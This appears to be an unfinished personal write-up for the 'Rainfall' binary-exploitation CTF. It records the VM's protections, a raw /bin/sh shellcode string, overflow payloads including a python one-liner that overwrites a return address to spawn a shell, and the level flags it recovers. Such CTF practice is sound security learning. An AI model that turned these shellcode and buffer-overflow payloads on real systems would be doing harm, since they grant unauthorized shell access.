# Rainfall

Port forwarding and shit

```
$ ssh level0@127.0.0.1 -p 25424
          _____       _       ______    _ _ 
         |  __ \     (_)     |  ____|  | | |
         | |__) |__ _ _ _ __ | |__ __ _| | |
         |  _  /  _` | | '_ \|  __/ _` | | |
         | | \ \ (_| | | | | | | | (_| | | |
         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on 10.0.2.15:4242
level0@127.0.0.1's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/level0/level0
```

## for gdb

```
(gdb) set disassembly-flavor intel
```

abcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcd0x08048444

abcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcd\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh

## level0

```
$ getfacl level0
# file: level0
# owner: level1
# group: users
# flags: s--
user::rwx
user:level0:r-x
user:level1:r-x
group::---
mask::r-x
other::---
```
Since the setUID bit is set, the level0 is run with the privilege of level1. 
So looking at the dissasembled code we see that we need to run ./level 423 to escape the condition that prints "No !"
Therefore the program runs a shell with level1 right, so we cd into level1 and
```
cat .pass
1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```

## level1

```
$ (python -c 'print("\x90" * 60 + "A" * 16 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
pwd
/home/user/level1
cd
/bin/sh: 2: cd: can't cd to /home/user/level1
cd /home/user/level2
ls
level2
cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

76 why????
+16 why ????
explain nop sled

## level2